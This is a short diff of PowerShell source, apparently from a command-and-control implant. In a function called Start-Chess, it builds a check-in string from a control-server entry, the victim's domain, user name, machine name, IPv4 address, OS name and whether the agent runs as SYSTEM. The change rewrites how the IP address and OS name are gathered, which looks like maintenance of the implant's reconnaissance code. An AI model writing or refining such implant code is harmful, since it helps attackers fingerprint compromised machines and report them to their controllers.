@@ -229,12 +229,12 @@ function Start-Chess {
         $str = '0|';
         $str += $Script:Cservs[$Script:sIndex];
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-        $p = Get-NetAdapter -Physical | Where-Object { $_.Status -eq 'Up' } | ForEach-Object {Get-NetIPAddress -InterfaceIndex $_.InterfaceIndex -AddressFamily IPv4} | Select-Object -ExpandProperty IPAddress;
+        $p = Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.IPAddress -notlike '127.*' } | Select-Object -ExpandProperty IPAddress;
         $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
         #if(!$ip -or $ip.trim() -eq '') {$ip='0.0.0.0'};
         $str+="|$ip";
 
-        $str += '|' +(Get-ComputerInfo).WindowsProductName;
+        $str += '|' +(Get-CimInstance -ClassName CIM_OperatingSystem).Caption;
         # if we're SYSTEM, we're high integrity
         if(([Environment]::UserName).ToLower() -eq 'system') {
             $str += '|True';
